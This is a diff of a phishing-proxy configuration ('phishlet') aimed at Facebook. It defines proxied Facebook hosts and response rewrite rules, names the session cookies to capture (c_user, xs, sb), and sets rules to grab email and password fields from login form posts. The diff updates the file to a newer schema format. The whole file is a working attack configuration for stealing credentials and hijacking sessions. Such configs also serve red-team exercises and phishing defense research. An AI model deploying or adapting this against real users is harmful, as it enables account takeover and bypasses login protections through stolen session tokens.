@@ -1,27 +1,29 @@
-name: 'facebook'
 author: '@mrgretzky'
-min_ver: '2.1.0'
+min_ver: '2.2.0'
 proxy_hosts:
   - {phish_sub: 'www', orig_sub: 'www', domain: 'facebook.com', session: true, is_landing: true}
   - {phish_sub: 'm', orig_sub: 'm', domain: 'facebook.com', session: true, is_landing: false}
   - {phish_sub: 'static', orig_sub: 'static', domain: 'xx.fbcdn.net', session: false, is_landing: false}
 sub_filters:
-  - {hostname: 'www.facebook.com', sub: 'www', domain: 'facebook.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json']}
-  - {hostname: 'www.facebook.com', sub: 'static', domain: 'xx.fbcdn.net', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json']}
-  - {hostname: 'm.facebook.com', sub: 'm', domain: 'facebook.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
-  - {hostname: 'm.facebook.com', sub: 'm', domain: 'facebook.com', search: '2F{hostname}', replace: '2F{hostname}', mimes: ['text/html', 'application/json', 'application/x-javascript']}
-  - {hostname: 'm.facebook.com', sub: 'm', domain: 'facebook.com', search: '\\\\\\/\\\\\\/{hostname}', replace: '\\\\\\/\\\\\\/{hostname}', mimes: ['text/html', 'application/json', 'application/x-javascript']}
-  - {hostname: 'm.facebook.com', sub: 'm', domain: 'facebook.com', search: 'https:\/\/{hostname}\/', replace: 'https:\/\/{hostname}\/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
-  - {hostname: 'm.facebook.com', sub: 'm', domain: 'facebook.com', search: '''{domain}'';', replace: '''{domain}'';', mimes: ['text/html', 'application/json', 'application/x-javascript']}
-  - {hostname: 'static.xx.fbcdn.net', sub: 'www', domain: 'facebook.com', search: ':"{domain}";', replace: ':"{domain}";', mimes: ['text/html', 'application/json', 'application/x-javascript']}
+  - {triggers_on: 'www.facebook.com', orig_sub: 'www', domain: 'facebook.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'www.facebook.com', orig_sub: 'static', domain: 'xx.fbcdn.net', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'm.facebook.com', orig_sub: 'm', domain: 'facebook.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
+  - {triggers_on: 'm.facebook.com', orig_sub: 'm', domain: 'facebook.com', search: '2F{hostname}', replace: '2F{hostname}', mimes: ['text/html', 'application/json', 'application/x-javascript']}
+  - {triggers_on: 'm.facebook.com', orig_sub: 'm', domain: 'facebook.com', search: '\\\\\\/\\\\\\/{hostname}', replace: '\\\\\\/\\\\\\/{hostname}', mimes: ['text/html', 'application/json', 'application/x-javascript']}
+  - {triggers_on: 'm.facebook.com', orig_sub: 'm', domain: 'facebook.com', search: 'https:\/\/{hostname}\/', replace: 'https:\/\/{hostname}\/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
+  - {triggers_on: 'm.facebook.com', orig_sub: 'm', domain: 'facebook.com', search: '''{domain}'';', replace: '''{domain}'';', mimes: ['text/html', 'application/json', 'application/x-javascript']}
+  - {triggers_on: 'static.xx.fbcdn.net', orig_sub: 'www', domain: 'facebook.com', search: ':"{domain}";', replace: ':"{domain}";', mimes: ['text/html', 'application/json', 'application/x-javascript']}
 auth_tokens:
   - domain: '.facebook.com'
     keys: ['c_user','xs','sb']
-user_regex:
-  key: 'email'
-  re: '(.*)'
-pass_regex:
-  key: 'pass'
-  re: '(.*)'
+credentials:
+  username:
+    key: 'email'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'pass'
+    search: '(.*)'
+    type: 'post'
 landing_path:
   - '/login.php'
